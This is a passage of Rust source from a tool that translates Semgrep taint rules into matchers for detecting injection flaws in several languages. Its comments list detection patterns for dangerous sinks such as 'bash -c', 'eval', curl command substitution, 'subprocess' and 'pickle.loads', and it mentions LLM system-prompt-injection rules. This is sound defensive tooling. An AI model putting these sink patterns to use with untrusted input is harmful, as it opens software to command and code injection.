            GenericMatcher::Call { .. } | GenericMatcher::MethodName { .. }
        ) {
            out.push(m);
        }
    }
}

/// If `mv` is constrained by an anchored alternation `metavariable-regex`
/// (`^(a|b|c)$`, with optional `\b...\b` word-boundary wrapping), return the
/// alternative names. Only plain-identifier alternatives are accepted; any
/// non-anchored or non-trivial regex yields `None` (we will not invent names).
fn regex_alternatives_for(mv: &str, metavar_regexes: &[(String, String)]) -> Option<Vec<String>> {
    let (_, re) = metavar_regexes.iter().find(|(m, _)| m == mv)?;
    parse_anchored_alternation(re)
}

/// Parse `^(a|b|c)$` or `\b(a|b|c)\b` (or a single `^a$` / `\ba\b`) into its
/// plain-identifier alternatives. Returns `None` for anything else — we never
/// guess at a non-trivial regex.
fn parse_anchored_alternation(re: &str) -> Option<Vec<String>> {
    let mut body = re.trim();
    // Strip start/end anchors.
    body = body.strip_prefix('^').unwrap_or(body);
    body = body.strip_suffix('$').unwrap_or(body);
    // Strip `\b ... \b` word boundaries.
    body = body.strip_prefix("\\b").unwrap_or(body);
    body = body.strip_suffix("\\b").unwrap_or(body);
    // Strip a single wrapping group.
    if body.starts_with('(') && body.ends_with(')') {
        body = &body[1..body.len() - 1];
    }
    if body.is_empty() {
        return None;
    }
    let names: Vec<String> = body.split('|').map(|s| s.trim().to_string()).collect();
    if names.iter().all(|n| is_identifier(n)) {
        Some(names)
    } else {
        None
    }
}

/// A bare-metavariable callee shape extracted from a `pattern:` text, tagged
/// with the metavariable that a `metavariable-regex` may pin.
enum BareCallee {
    /// `$F(...)` — the whole callee is a metavariable. Compiles to `CallRegex`
    /// (the regex is tested against the full callee text).
    Callee(String),
    /// `$OBJ.$M(...)` — metavariable receiver, metavariable method. Compiles to
    /// `MethodNameRegex` (the regex is tested against the final method name).
    Method(String),
}

/// If `pat` is a call whose callee is a bare metavariable (`$F(...)`) or a
/// metavariable-receiver / metavariable-method (`$OBJ.$M(...)`), return the
/// constrainable metavariable tagged with its shape. Any concrete or partially
/// concrete callee returns `None` (handled by the normal pattern compiler).
fn bare_metavar_callee(pat: &str) -> Option<BareCallee> {
    let c = pat.trim().trim_end_matches(';').trim();
    let open = c.find('(')?;
    let callee = c[..open].trim();
    if let Some(dot) = callee.find('.') {
        let recv = &callee[..dot];
        let meth = &callee[dot + 1..];
        if is_metavariable(recv) && is_metavariable(meth) && !meth.contains('.') {
            return Some(BareCallee::Method(meth.to_string()));
        }
        return None;
    }
    if is_metavariable(callee) {
        return Some(BareCallee::Callee(callee.to_string()));
    }
    None
}

/// Collect, across a `patterns:` block (recursing into `pattern-either:`),
/// every bare-metavariable callee shape from `pattern:` texts and every
/// `metavariable-regex` (metavariable, regex) pin.
fn collect_regex_callee_parts(
    items: &[YamlValue],
    callees: &mut Vec<BareCallee>,
    pins: &mut Vec<(String, String)>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (key, val) in map {
            match key.as_str() {
                Some("pattern") => {
                    if let Some(text) = val.as_str() {
                        if let Some(bc) = bare_metavar_callee(text) {
                            callees.push(bc);
                        }
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(mm) = val.as_mapping() {
                        let mv = mm
                            .get(YamlValue::from("metavariable"))
                            .and_then(|x| x.as_str());
                        let re = mm.get(YamlValue::from("regex")).and_then(|x| x.as_str());
                        if let (Some(mv), Some(re)) = (mv, re) {
                            pins.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                Some("pattern-either") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_regex_callee_parts(seq, callees, pins);
                    }
                }
                _ => {}
            }
        }
    }
}

/// Try to recognise the "regex-bounded bare-metavariable callee" SINK shape: a
/// `patterns:` AND-block pairing a bare-metavar callee pattern (`$F(...)` or
/// `$OBJ.$M(...)`) with a `metavariable-regex` that pins that metavariable.
///
/// On recognition, compiles a name-constrained [`GenericMatcher::CallRegex`]
/// (full-callee regex) or [`GenericMatcher::MethodNameRegex`] (method-name
/// regex) and returns `true`. The compiled regex is enforced at match time, so
/// the otherwise-universal bare-metavar callee becomes FP-safe (only callees
/// whose name matches the regex fire).
///
/// Returns `false` (pushing nothing) when no bare-metavar callee is pinned by a
/// `metavariable-regex` — preserving the existing refusal of an unpinned
/// bare-metavar callee. Only the Sink/Sanitizer roles call this.
fn try_compile_regex_constrained_callee_block(
    v: &YamlValue,
    role: MatcherRole,
    rule_id: &str,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };
    let mut callees: Vec<BareCallee> = Vec::new();
    let mut pins: Vec<(String, String)> = Vec::new();
    collect_regex_callee_parts(items, &mut callees, &mut pins);

    if callees.is_empty() || pins.is_empty() {
        return false;
    }

    let before = out.len();
    for callee in &callees {
        let (mv, is_method) = match callee {
            BareCallee::Callee(mv) => (mv, false),
            BareCallee::Method(mv) => (mv, true),
        };
        // The metavariable MUST be pinned by a `metavariable-regex` — otherwise
        // we stay FP-safe and refuse this bare-metavar callee.
        let Some((_, re)) = pins.iter().find(|(m, _)| m == mv) else {
            continue;
        };
        let regex = match crate::rules::semgrep_compat::compile_regex(re) {
            Ok(r) => r,
            Err(e) => {
                eprintln!(
                    "Warning: taint rule `{}` {} `metavariable-regex` for `{}` is not a valid \
                     regex ({}); refusing the bare-metavariable callee (FP-safe)",
                    rule_id,
                    role.label(),
                    mv,
                    e
                );
                continue;
            }
        };
        let description = describe(re, role);
        if is_method {
            out.push(GenericMatcher::MethodNameRegex { regex, description });
        } else {
            out.push(GenericMatcher::CallRegex { regex, description });
        }
    }

    out.len() > before
}

/// If `pat` is a call whose callee is `$OBJ.method` — a single Semgrep
/// metavariable receiver segment followed by exactly one plain-identifier
/// method (no further dots) — return `(receiver_metavariable, method)`.
///
/// This is the shape that the normal pattern compiler turns into a
/// receiver-agnostic `MethodName { method }` sink (see
/// [`parse_metavar_dot_method`]); recognising it here lets a companion
/// `metavariable-regex` on the receiver pin the otherwise-any receiver.
/// A concrete receiver (`db.method` — already a plain `Call`), a metavariable
/// method (`$OBJ.$M` — handled by the callee-regex path), or a nested receiver
/// (`$OBJ.sub.method`) all return `None`.
fn metavar_receiver_concrete_method(pat: &str) -> Option<(String, String)> {
    let c = pat.trim().trim_end_matches(';').trim();
    let open = c.find('(')?;
    if !c.ends_with(')') {
        return None;
    }
    let callee = c[..open].trim();
    let dot = callee.find('.')?;
    let recv = &callee[..dot];
    let method = &callee[dot + 1..];
    if is_metavariable(recv) && !method.contains('.') && is_identifier(method) {
        Some((recv.to_string(), method.to_string()))
    } else {
        None
    }
}

/// Collect, across a `patterns:` block (recursing into `pattern-either:`),
/// every metavariable-receiver concrete-method call shape (`$OBJ.method(...)`)
/// from `pattern:` texts and every `metavariable-regex` (metavariable, regex)
/// pin. Companion to [`collect_regex_callee_parts`] for the receiver side.
fn collect_regex_receiver_parts(
    items: &[YamlValue],
    receivers: &mut Vec<(String, String)>,
    pins: &mut Vec<(String, String)>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (key, val) in map {
            match key.as_str() {
                Some("pattern") => {
                    if let Some(text) = val.as_str() {
                        if let Some(rm) = metavar_receiver_concrete_method(text) {
                            receivers.push(rm);
                        }
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(mm) = val.as_mapping() {
                        let mv = mm
                            .get(YamlValue::from("metavariable"))
                            .and_then(|x| x.as_str());
                        let re = mm.get(YamlValue::from("regex")).and_then(|x| x.as_str());
                        if let (Some(mv), Some(re)) = (mv, re) {
                            pins.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                Some("pattern-either") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_regex_receiver_parts(seq, receivers, pins);
                    }
                }
                _ => {}
            }
        }
    }
}

/// Try to recognise the "regex-bounded metavariable-RECEIVER" SINK shape: a
/// `patterns:` AND-block pairing a metavariable-receiver concrete-method call
/// (`$OBJ.method(...)`) with a `metavariable-regex` whose anchored alternation
/// pins the receiver metavariable `$OBJ` to a fixed set of plain-identifier
/// receiver names.
///
/// On recognition, enumerates one concrete [`GenericMatcher::Call`]
/// (`canonical: "<recv>.method"`) per listed receiver name and returns `true`.
/// The exact-callee `Call` sink matching in
/// [`taint_engine::match_call_sink`] then fires only when the resolved callee
/// equals one of those names — strictly narrower than the receiver-agnostic
/// `MethodName { method }` the unpinned pattern would otherwise produce.
///
/// Returns `false` (pushing nothing) when the receiver is not pinned by an
/// *anchored alternation of plain identifiers* — a general receiver regex has
/// no exact-callee enumeration, so the entry falls through to the normal
/// graceful-degradation extraction (still the broad `MethodName`). Only the
/// Sink/Sanitizer roles call this.
///
/// Deferral (FP-safe narrowing): an enumerated `Call { "<recv>.method" }`
/// requires the runtime receiver to equal one listed name *exactly*; a deeper
/// receiver chain (`a.b.method`, where Semgrep would bind `$OBJ = a.b`) is
/// intentionally NOT matched. We never over-fire.
fn try_compile_regex_constrained_receiver_block(
    v: &YamlValue,
    role: MatcherRole,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };
    let mut receivers: Vec<(String, String)> = Vec::new();
    let mut pins: Vec<(String, String)> = Vec::new();
    collect_regex_receiver_parts(items, &mut receivers, &mut pins);

    if receivers.is_empty() || pins.is_empty() {
        return false;
    }

    let before = out.len();
    for (recv_mv, method) in &receivers {
        // The receiver metavariable MUST be pinned by an anchored alternation of
        // plain identifiers; otherwise we stay FP-safe and let the entry fall
        // through to the broad `MethodName` extraction.
        let Some(names) = regex_alternatives_for(recv_mv, &pins) else {
            continue;
        };
        for name in names {
            let canonical = format!("{name}.{method}");
            out.push(GenericMatcher::Call {
                description: describe(&canonical, role),
                canonical,
            });
        }
    }

    out.len() > before
}

/// Compile a Bash-specific pattern (shell command or command substitution)
/// into a `Call` matcher keyed by the command name.
///
/// The Bash engine treats a `Call { canonical: "<cmd>" }` matcher as "a shell
/// command whose command name is `<cmd>`" (or, for sources, a command
/// substitution / pipeline whose first command name is `<cmd>`). This lets the
/// generic [`GenericMatcher::Call`] variant carry Bash shell-command sinks and
/// sources without adding a new variant.
fn compile_bash_pattern(pat: &str, role: MatcherRole) -> Option<GenericMatcher> {
    // Strip a leading `$VAR=` assignment so `$VAR=$(... | jq ...)` resolves to
    // its RHS command substitution.
    let rhs = match pat.split_once('=') {
        Some((lhs, rhs)) if lhs.trim_start_matches('$').chars().all(is_ident_char) => rhs.trim(),
        _ => pat,
    };

    // Unwrap a command substitution `$(...)` or backtick `` `...` ``.
    let inner = if let Some(stripped) = rhs.strip_prefix("$(") {
        stripped.strip_suffix(')').unwrap_or(stripped).trim()
    } else if let Some(stripped) = rhs.strip_prefix('`') {
        stripped.strip_suffix('`').unwrap_or(stripped).trim()
    } else {
        rhs
    };

    // The command name is the first whitespace-delimited token. For a pipeline
    // (`cat | jq ...`), the meaningful command for sources is the LAST stage
    // (`jq`) when present, else the first; for sinks it is the first token.
    let cmd = match role {
        MatcherRole::Source => {
            if let Some((_, after_pipe)) = inner.rsplit_once('|') {
                first_token(after_pipe)
            } else {
                first_token(inner)
            }
        }
        MatcherRole::Sink | MatcherRole::Sanitizer => first_token(inner),
    }?;

    // The command name must be a plain identifier-like shell word.
    if cmd.is_empty() || !cmd.chars().all(is_ident_char) {
        return None;
    }

    Some(GenericMatcher::Call {
        canonical: cmd.to_string(),
        description: describe(cmd, role),
    })
}

/// First whitespace-delimited token of a shell command fragment, ignoring a
/// leading subshell `(`.
fn first_token(s: &str) -> Option<&str> {
    s.trim().trim_start_matches('(').split_whitespace().next()
}

fn is_ident_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_' || c == '-'
}

/// True when `pat` is a function-signature source pattern of the form
/// `function $F(...) <vis> {...}` (Solidity) or `def $C(...) = ...` (Scala) —
/// i.e. a parameter-of-a-function source. The body / visibility specifics are
/// irrelevant; we only require the leading keyword and a parameter list with a
/// Semgrep metavariable. Used to compile such sources to an any-parameter seed.
fn is_function_signature_source(pat: &str) -> bool {
    let pat = pat.trim();
    let starts_fn = pat.starts_with("function ") || pat.starts_with("def ");
    if !starts_fn {
        return false;
    }
    // Must declare a parameter list and reference at least one metavariable
    // parameter (`$X`), so we don't seed on a zero-arg signature.
    pat.contains('(') && pat.contains('$')
}

/// True when `pat` is a Swift "string built dynamically" source pattern:
///
/// - an interpolated string literal `"...\($X)..."` (contains `\(` and `$`);
/// - a concatenation assigned to a variable, `$SQL = "..." + $X` or
///   `$SQL = $X + "..."` (a `=` LHS metavariable, a `+`, a quoted literal, and
///   a metavariable operand).
///
/// These compile to the Swift string-construction sentinel source.
fn is_swift_string_construction_source(pat: &str) -> bool {
    let p = pat.trim();
    // Interpolated string literal: `"...\($X)..."`.
    if p.starts_with('"') && p.contains("\\(") && p.contains('$') {
        return true;
    }
    // Concatenation assignment: `$VAR = "..." + $X` / `$VAR = $X + "..."`.
    if let Some(eq) = find_single_assignment(p) {
        let rhs = p[eq + 1..].trim();
        if rhs.contains('+') && rhs.contains('"') && rhs.contains('$') {
            return true;
        }
    }
    false
}

/// Recognise an Apex chained-call request source of the form
/// `ROOT.<...calls...>.method($MV)` — a method chain rooted at a concrete
/// identifier (`ApexPage`, `RestContext`, …), whose final `.method($MV)` reads
/// a request value into a metavariable. Returns the canonical `ROOT.method`
/// pair, or `None`.
///
/// Examples:
/// - `ApexPage.getCurrentPage().getParameters().get($URLPARAM)`
///   → `Some("ApexPage.get")`
/// - `ApexPage.getCurrentPage().getParameters.get($URLPARAM)`
///   → `Some("ApexPage.get")`
fn parse_apex_chained_call_source(pat: &str) -> Option<String> {
    let p = pat.trim();
    // Must end with a call whose argument list references a metavariable.
    if !p.ends_with(')') {
        return None;
    }
    let open = p.find('(')?;
    // The callee text is everything before the FIRST `(` in a left-to-right
    // chain — but here the first `(` belongs to an intermediate call, so we
    // instead split on the final `.method(` boundary.
    let last_call_open = p.rfind('(')?;
    let callee_chain = p[..last_call_open].trim();
    // Final method name = segment after the last `.` in the callee chain.
    let method = callee_chain.rsplit('.').next()?;
    if method.is_empty()
        || !method
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_')
    {
        return None;
    }
    // Root identifier = leading identifier before the first `.` or `(`.
    let root_end = callee_chain.find(['.', '(']).unwrap_or(callee_chain.len());
    let root = callee_chain[..root_end].trim();
    if root.is_empty() || !root.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        return None;
    }
    // Require an intermediate call chain (so a plain `root.method(...)` keeps
    // going through the normal Call branch, not this Apex-specific one).
    let has_inner_call = open < last_call_open;
    if !has_inner_call {
        return None;
    }
    // The argument list must reference a metavariable (the focused URL param).
    let args = &p[last_call_open + 1..p.len() - 1];
    if !args.contains('$') {
        return None;
    }
    Some(format!("{root}.{method}"))
}

/// Compile a single Semgrep pattern string into a [`NodeMatcher`].
///
/// Returns `None` if the pattern shape is not one of the supported forms
/// (see module docs). Callers surface that as a skip-with-warning at the
/// rule level.
fn compile_pattern(pattern: &str, role: MatcherRole, lang: Language) -> Option<GenericMatcher> {
    let mut pat = pattern.trim();
    if pat.is_empty() {
        return None;
    }

    // Solidity / Apex statement patterns carry a trailing `;` (e.g.
    // `selfdestruct(...);`, `Database.query($SINK,...);`,
    // `req.setHeader($X, ...);`). Strip it so the call/member shapes below
    // recognise them.
    if matches!(lang, Language::Solidity | Language::Apex) {
        pat = pat.trim_end_matches(';').trim_end();
    }

    // ── Swift string-construction source: `"...\($X)..."`, `$SQL = "..." + $X`,
    //    `$SQL = $X + "..."` ───────────────────────────────────────────────
    //
    // The Swift `swift-potential-sqlite-injection` rule expresses its source as
    // a string assembled by interpolation or by concatenation with a dynamic
    // operand — the constructed string is itself the (low-confidence) taint
    // origin (there is no parameter binding). None of the generic call/param/
    // field shapes recognise these, so we compile them to a sentinel
    // `ParamName` source that the Swift engine interprets as "any interpolated
    // or concatenated string is tainted" (see
    // `swift_taint::STRING_CONSTRUCTION_SENTINEL`). Source role only.
    if lang == Language::Swift {
        if let MatcherRole::Source = role {
            if is_swift_string_construction_source(pat) {
                return Some(GenericMatcher::ParamName {
                    names: vec![swift_taint::STRING_CONSTRUCTION_SENTINEL.to_string()],
                    description: "dynamically constructed string".to_string(),
                });
            }
        }
    }

    // ── Apex chained-call request source: `ROOT.....method($MV)` ────────────
    //
    // Apex SOQL-injection rules read the inbound request parameter via a method
    // chain, e.g. `ApexPage.getCurrentPage().getParameters().get($URLPARAM)`.
    // None of the generic call shapes recognise a callee whose receiver itself
    // contains call parens, so this would otherwise skip. We compile it to a
    // `Call { canonical: "ROOT.method" }` keyed by the leading root identifier
    // and the final method name; the Apex engine matches a `method_invocation`
    // whose final method equals `method` and whose receiver chain contains
    // `ROOT` (so `ApexPage.getCurrentPage()....get(...)` matches `ApexPage.get`).
    // Source role only.
    if lang == Language::Apex {
        if let MatcherRole::Source = role {
            if let Some(canonical) = parse_apex_chained_call_source(pat) {
                return Some(GenericMatcher::Call {
                    description: format!("untrusted `{canonical}` request input"),
                    canonical,
                });
            }
        }
    }

    // ── Bash command / command-substitution shapes ───────────────────────
    //
    // Bash taint rules express sources and sinks as shell commands rather than
    // call expressions, so none of the generic shapes below recognise them.
    // We map a shell command (or command substitution) to a `Call` matcher
    // keyed by the *command name*, which the Bash engine interprets in its own
    // node vocabulary (`command` / `command_substitution`). Examples:
    //   `$(curl ...)`        → Call { "curl" }   (command-substitution source)
    //   `$(cat | jq ...)`    → Call { "cat" }    (first command in a pipeline)
    //   `$VAR=$(... | jq ...)` → Call { "jq" }   (assignment from a pipeline)
    //   `eval ...`           → Call { "eval" }   (command sink)
    //   `cat $SINK`          → Call { "cat" }    (command sink)
    //   `bash -c $...SINK`   → Call { "bash" }   (command sink)
    //   `realpath ...`       → Call { "realpath" } (sanitizer)
    if lang == Language::Bash {
        if let Some(m) = compile_bash_pattern(pat, role) {
            return Some(m);
        }
    }

    // ── Function-signature source: `function $F(..., type $X, ...) public {...}`
    //    (Solidity) / `def $C(..., $P: $T, ...) = ...` (Scala) ───────────────
    //
    // Several Solidity and Scala taint rules express their source as "a
    // parameter of a public/external function" via a full function-signature
    // pattern. None of the generic call/attribute shapes recognise these, so
    // they would otherwise compile to nothing and skip the rule. We compile
    // such a signature to a metavariable [`GenericMatcher::ParamName`] (a name
    // beginning with `$`), which the Solidity / Scala engines interpret as
    // "seed every parameter of the enclosing function as tainted" — matching
    // Semgrep's any-parameter semantics. Source role only.
    if matches!(lang, Language::Solidity | Language::Scala) {
        if let MatcherRole::Source = role {
            if is_function_signature_source(pat) {
                return Some(GenericMatcher::ParamName {
                    names: vec!["$PARAM".to_string()],
                    description: "untrusted function parameter".to_string(),
                });
            }
        }
    }

    // ── ObjectLiteralValue form: tainted value in an object/dict literal ──
    //
    // LLM system-prompt-injection rules (`openai`/`mistral`) express their sink
    // as an object/dict literal whose value field carries tainted text:
    //   `{role: "system", content: $SINK}`        (JS object literal)
    //   `{"role": "system", "content": $SINK}`    (Python dict)
    // The bridge compiles these to an `ObjectLiteralValue` sink; the JS/Python
    // engines fire only when an object/dict literal is actually constructed AND
    // a tainted value reaches one of its value positions. Sink/sanitizer only —
    // a literal construction is a data-flow destination, not a taint origin.
    if is_object_literal_value_pattern(pat) {
        return match role {
            MatcherRole::Sink | MatcherRole::Sanitizer => {
                Some(GenericMatcher::ObjectLiteralValue {
                    description: describe(pat, role),
                })
            }
            MatcherRole::Source => None,
        };
    }

    // ── ReturnValue form: `return $METAVAR` (tainted return value) ────────
    //
    // LLM "unsanitized return" and Flask directly-returned-format rules express
    // their sink as a `return` statement returning a tainted value:
    //   `return $SINK`   /   `return $X`
    // The bridge compiles these to a `ReturnValue` sink; the Python engine fires
    // only when a `return` statement actually returns a tainted value. Bounded
    // to return position (NOT a universal bare-metavar sink). Sink/sanitizer
    // only — a return is a data-flow destination, not a taint origin.
    if let Some(()) = parse_return_metavar(pat) {
        return match role {
            MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::ReturnValue {
                description: describe(pat, role),
            }),
            MatcherRole::Source => None,
        };
    }

    // ── BinopFormat form: string-building sinks ──────────────────────────
    //
    // Semgrep SQL/command-string sinks express tainted concatenation as a
    // binary `+`/`%` expression or an f-string interpolation: `"$SQL" + $EXPR`,
    // `$A + $B`, `$M % $M`, `f"...{$X}..."`. The bridge compiles these to a
    // `BinopFormat` sink; the engine fires only when one operand is a string
    // literal/format AND another operand is tainted, so a literal-only or
    // numeric concatenation never fires (conservative — avoids FPs).
    //
    // Sink/sanitizer only — a concatenation is a data-flow destination, and the
    // `BinopFormat` literal-guard makes it nonsensical as a taint origin.
    if is_binop_format_pattern(pat) {
        return match role {
            MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::BinopFormat {
                description: describe(pat, role),
            }),
            MatcherRole::Source => None,
        };
    }

    // ── Subscript form: `base[...]` / `base[$K]` ─────────────────────────
    //
    // Semgrep taint rules express request-map indexing as a subscript:
    // `params[...]`, `cookies[...]`, `request.POST[...]`,
    // `flask.request.args[...]`, `$VALS[$INDEX]`, `$M[$K]`. The bridge
    // compiles these to `Subscript { base }`, where `base` is the final
    // identifier segment before the `[` (or `None` for a metavariable base).
    //
    // Detection: the pattern ends with `]`, contains a `[`, and the portion
    // before the first `[` is a recognizable base (plain identifier, dotted
    // attribute chain, or a metavariable / metavariable-tailed chain). No
    // top-level `=` (that is a MemberAssign) and the base must not itself be
    // a call. Valid as a source, sink, or sanitizer.
    if let Some(base) = parse_subscript_base(pat) {
        let desc = match &base {
            Some(b) => describe(b, role),
            None => describe(pat, role),
        };
        return Some(GenericMatcher::Subscript {
            base,
            description: desc,
        });
    }

    // ── MemberAssign form: `$METAVAR.field = $X` ────────────────────────
    //
    // Semgrep taint rules for DOM-XSS commonly express property-assignment
    // sinks as `$EL.innerHTML = $X`, `$EL.outerHTML = $X`, etc.  The bridge
    // compiles these to `MemberAssign { field }`, which the JavaScript engine
    // matches against any assignment whose LHS property name equals `field`.
    //
    // Detection: the pattern contains ` = ` (single `=`, not `==`), and the
    // LHS parses as `$METAVAR.plain_field` with no call parens.
    //
    // Only valid as a sink or sanitizer shape — not a source, since a
    // property assignment is a data-flow destination, not an origin.
    if let Some(field) = parse_member_assign_pattern(pat) {
        return match role {
            MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::MemberAssign {
                field: field.to_string(),
                description: describe(field, role),
            }),
            MatcherRole::Source => None,
        };
    }

    // ── Call form: `root.method(...)` or `func($X)` ─────────────────────
    if let Some(open_paren) = pat.find('(') {
        if !pat.ends_with(')') {
            return None;
        }
        let callee = pat[..open_paren].trim();
        if callee.is_empty() {
            return None;
        }

        // ── MethodName shape: `$METAVAR.method($X)` ─────────────────────
        //
        // When the callee is `$VAR.method` — a single metavariable segment
        // followed by exactly one plain identifier — we compile to
        // `MethodName { method }`, which the engine matches against the
        // *final* segment of any resolved callee regardless of receiver.
        //
        // This covers the common Semgrep pattern shape used for OOP sinks
        // like `$CONN.executeQuery($X)`, `$OBJ.innerHTML`, etc., that are
        // currently warn-skipped because the `$`-prefixed segment fails the
        // `is_dotted_identifier` check.
        //
        // Only meaningful as a sink/sanitizer shape (matching any receiver),
        // not a source.
        if let Some(method) = parse_metavar_dot_method(callee) {
            return match role {
                MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::MethodName {
                    method: method.to_string(),
                    description: describe(method, role),
                }),
                MatcherRole::Source => None,
            };
        }

        // ── CALL-ON-MEMBER shape: `<root>.<field>.method($X)` ──────────────
        //
        // A method call whose receiver is itself a member-access chain with a
        // metavariable somewhere (so it is NOT a fully-concrete dotted path,
        // which the `Call` branch already handles). Examples:
        //   `$CLIENT.chat.completions.create(...)` → field `completions`
        //   `$CLIENT.messages.create(...)`         → field `messages`
        //   `$REQ.POST.get(...)`                   → field `POST`
        //
        // The compiled matcher is a `FieldName` on the *penultimate* segment
        // (the field read immediately before the final method). The engine
        // taints that member-read; the trailing `.method(...)` propagates the
        // taint via the existing method-call-on-tainted-root rule. This reuses
        // the FieldName machinery with no new engine variant.
        //
        // Discipline: we only accept this when the penultimate segment is a
        // *concrete* identifier (so we never compile a bare `.get(...)` /
        // `.method(...)` any-receiver matcher, which would be far too broad).
        // The root may be a metavariable or a concrete identifier; any
        // intermediate segments may be metavariables or identifiers.
        if let Some(field) = parse_member_call_penultimate(callee) {
            return Some(GenericMatcher::FieldName {
                field: field.to_string(),
                description: describe(field, role),
            });
        }

        // ── ReceiverCall shape: `receiver.$METHOD($X)` ──────────────────
        //
        // The symmetric counterpart of `MethodName`: a *concrete* receiver
        // identifier followed by a *metavariable* method. Compiled to
        // `ReceiverCall { receiver }`, matching any call whose callee root
        // equals `receiver` regardless of the method name. Covers the common
        // module-call sink shapes `os.$METHOD(...)`, `subprocess.$FUNC(...)`,
        // `Kernel.$X(...)`, `Shell.$X(...)`. Sink/sanitizer only.
        if let Some(receiver) = parse_receiver_dot_metavar(callee) {
            return match role {
                MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::ReceiverCall {
                    receiver: receiver.to_string(),
                    description: describe(receiver, role),
                }),
                MatcherRole::Source => None,
            };
        }

        // Callee must be a plain identifier or dotted identifier chain.
        if !is_dotted_identifier(callee) {
            return None;
        }
        let canonical = callee.to_string();
        return Some(GenericMatcher::Call {
            canonical: canonical.clone(),
            description: describe(&canonical, role),
        });
    }

    // ── PHP-style bare variable: `$_GET`, `$_POST`, `$_REQUEST`, etc. ──────
    //
    // PHP superglobals and user-defined variables start with `$` followed by
    // a valid identifier. When a Semgrep rule for PHP uses a pattern like
    // `$_GET` as a source, `is_dotted_identifier` fails (because `$` is not
    // an ASCII letter or underscore). We handle this explicitly BEFORE the
    // `is_dotted_identifier` guard: a bare `$name` pattern (no call parens,
    // no dots, no spaces) is compiled as `ParamName` for source roles. This
    // allows PHP taint rules to use `pattern: $_GET` as a source.
    if is_php_variable(pat) {
        return match role {
            MatcherRole::Source => Some(GenericMatcher::ParamName {
                names: vec![pat.to_string()],
                description: format!("untrusted `{}` input", pat),
            }),
            MatcherRole::Sink | MatcherRole::Sanitizer => None,
        };
    }

    // ── FieldName form: `$METAVAR.field` (any-receiver property read) ─────
    //
    // Semgrep taint rules overwhelmingly express web-request sources as a
    // property read on a metavariable receiver: `$REQ.body`, `$REQ.query`,
    // `$REQ.headers`, `$REQ.cookies`, `$REQ.params`, `$CTX.params`, etc.
    // The `Attribute` shape requires a *concrete* root identifier, so it
    // rejects a metavariable receiver. `FieldName` matches a property/
    // attribute READ of `field` regardless of receiver.
    //
    // Detection: exactly `$METAVAR.plain_identifier` — a single metavariable
    // segment, a single plain-identifier field, no call parens (handled
    // above), and no assignment `=` (MemberAssign handled above). Valid as a
    // source, sink, or sanitizer shape.
    if let Some(field) = parse_metavar_dot_method(pat) {
        return Some(GenericMatcher::FieldName {
            field: field.to_string(),
            description: describe(field, role),
        });
    }

    // ── Concrete-root, metavar-field source: `request.$ANYTHING` ─────────
    //
    // Django/Flask express "any attribute of the request object is untrusted"
    // as `request.$ANYTHING` (a *concrete* root identifier followed by a
    // metavariable field). We seed taint on the concrete root identifier as a
    // `ParamName` source: because the engine propagates taint from a tainted
    // root through attribute reads (`request.GET`, `request.POST`, …), seeding
    // the root covers every `request.<field>` access — exactly the intent of
    // the wildcard field. Only meaningful as a SOURCE.
    //
    // Discipline: the ROOT must be a concrete identifier (we refuse a
    // metavariable root like `$REQ.$ANYTHING`, which would taint every member
    // access on every receiver — a universal matcher with severe FP risk).
    if let MatcherRole::Source = role {
        if let Some(root) = parse_concrete_root_metavar_field(pat) {
            return Some(GenericMatcher::ParamName {
                names: vec![root.to_string()],
                description: format!("untrusted `{}` request object", root),
            });
        }
    }

    // ── No parens: identifier or attribute chain ────────────────────────
    if !is_dotted_identifier(pat) {
        return None;
    }

    if let Some(dot) = pat.rfind('.') {
        // `root.field` or `root.intermediate.field`. The engine only
        // supports one-level roots, so we take the leftmost segment as
        // the root and the outermost (last) segment as the field.
        let root = pat[..pat.find('.').expect("rfind guarantees at least one dot")].to_string();
        let field = pat[dot + 1..].to_string();
        if root.is_empty() || field.is_empty() {
            return None;
        }
        let desc = describe(pat, role);
        return Some(GenericMatcher::Attribute {
            root,
            field,
            description: desc,
        });
    }

    // Bare identifier → treat as a ParamName source / sink would not make
    // sense, so for non-source roles we refuse this shape.
    match role {
        MatcherRole::Source => Some(GenericMatcher::ParamName {
            names: vec![pat.to_string()],
            description: format!("untrusted `{}` parameter", pat),
        }),
        MatcherRole::Sink | MatcherRole::Sanitizer => None,
    }
}

/// If `pat` has the assignment shape `$METAVAR.field = $RHS` — a metavariable
/// receiver, a plain identifier property name, a single `=` operator, and any
/// RHS expression — return the property field name.  Returns `None` for all
/// other shapes (including `==`, `!=`, `<=`, `>=` operators).
///
/// Examples:
/// - `$EL.innerHTML = $X`  → `Some("innerHTML")`
/// - `$EL.outerHTML = $X`  → `Some("outerHTML")`
/// - `$FORM.action = $X`   → `Some("action")`
/// - `pickle.loads($X)`    → `None` (call form, no `=`)
/// - `$EL.innerHTML == $X` → `None` (equality comparison, not assignment)
/// - `$EL.a.b = $X`        → `None` (multi-segment LHS, ambiguous)
fn parse_member_assign_pattern(pat: &str) -> Option<&str> {
    // Find ` = ` with single `=` — must not be preceded or followed by
    // `=`, `!`, `<`, `>` to avoid confusing `==`, `!=`, `<=`, `>=`.
    let eq_pos = find_single_assignment(pat)?;
    let lhs = pat[..eq_pos].trim();
    // No call parens allowed in the LHS.
    if lhs.contains('(') || lhs.contains(')') {
        return None;
    }
    // LHS must have exactly the shape `$METAVAR.field`.
    parse_metavar_dot_method(lhs)
}

/// Find the byte offset of a standalone `=` in `s`, i.e. `=` that is not
